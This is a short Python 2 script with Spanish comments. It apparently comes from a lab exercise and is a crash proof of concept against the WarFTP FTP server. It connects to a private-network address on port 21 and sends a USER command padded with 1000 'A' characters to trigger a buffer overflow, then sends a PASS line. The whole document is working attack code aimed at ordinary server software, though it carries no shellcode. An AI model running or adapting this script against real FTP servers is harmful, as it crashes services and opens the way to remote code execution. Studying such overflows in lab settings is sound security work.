#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# Cantidad que le meto para que rompa
buffer = "\x41" * 1000
s.connect(('10.0.2.16',21))
data = s.recv(1024)
print ("Enviando al WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Final")
